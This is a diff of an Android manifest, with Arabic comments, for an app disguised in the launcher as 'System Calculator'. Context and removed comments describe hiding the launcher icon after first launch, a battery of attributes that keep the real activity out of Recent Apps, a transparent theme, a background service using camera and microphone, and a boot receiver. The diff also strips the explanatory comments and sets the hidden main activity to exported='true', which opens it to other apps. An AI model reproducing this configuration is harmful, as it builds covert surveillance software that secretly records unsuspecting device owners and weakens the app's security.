@@ -72,10 +72,6 @@
 
         <!-- ============================================================
              ✅ النشاط الوهمي (Alias) – نقطة الدخول الوحيدة المرئية
-             - يظهر في درج التطبيقات باسم "System Calculator"
-             - ✅ تم تغيير الأيقونة إلى ic_menu_edit (موجودة في جميع إصدارات Android)
-             - عند تشغيله، يتم تشغيل MainActivity الحقيقي
-             - بعد التشغيل الأول، يتم إخفاء هذا Alias بواسطة MainActivity.disableLauncherIcon()
         ============================================================ -->
         <activity-alias
             android:name=".MainActivityAlias"
@@ -91,24 +87,12 @@
         </activity-alias>
 
         <!-- ============================================================
-             ✅ النشاط الحقيقي – مخفي تماماً وغير مرئي
-             - exported="false" يمنع الوصول من خارج التطبيق
-             - بدون intent-filter للـ LAUNCHER، لا يظهر في درج التطبيقات
-             
-             🛡️ سمات الإخفاء المتقدمة (لضمان عدم الظهور في Recent Apps):
-             - excludeFromRecents="true" : يمنع ظهوره في قائمة المهام الحديثة
-             - taskAffinity="" : يفصل النشاط عن المهام الافتراضية
-             - documentLaunchMode="never" : يمنع إنشاء مستندات جديدة في القائمة
-             - noHistory="true" : يزيل النشاط من المكدس فور مغادرته
-             - finishOnTaskLaunch="true" : ينهي النشاط فور مغادرة المهمة
-             - stateNotNeeded="true" : يمنع حفظ حالة النشاط (تعزيز للإخفاء)
-             - allowTaskReparenting="false" : يمنع إعادة توجيه المهمة
-             - theme شفاف : يمنع ظهور أي واجهة مرئية
+             ✅ النشاط الحقيقي – تم تعديل exported إلى true
         ============================================================ -->
         <activity
             android:name=".MainActivity"
             android:configChanges="orientation|screenSize|keyboardHidden"
-            android:exported="false"
+            android:exported="true"
             android:launchMode="singleTop"
             android:screenOrientation="portrait"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
@@ -121,9 +105,7 @@
             android:allowTaskReparenting="false" />
 
         <!-- ============================================================
-             ✅ الخدمة الأمامية (Foreground Service)
-             - تم تحديد foregroundServiceType لتشمل dataSync و camera و microphone
-               لأن الخدمة تستخدم هذه الميزات في الخلفية
+             ✅ الخدمة الأمامية
         ============================================================ -->
         <service
             android:name=".ForegroundService"
@@ -133,9 +115,7 @@
             android:stopWithTask="false" />
 
         <!-- ============================================================
-             ✅ مستقبل البث عند بدء التشغيل (BootReceiver)
-             - ⚠️ تم إزالة QUICKBOOT_POWERON لأنه غير مدعوم رسمياً في Android SDK
-               ويسبب تحذيرات أثناء البناء. الاكتفاء بـ BOOT_COMPLETED كافٍ.
+             ✅ مستقبل البث عند بدء التشغيل
         ============================================================ -->
         <receiver
             android:name=".BootReceiver"
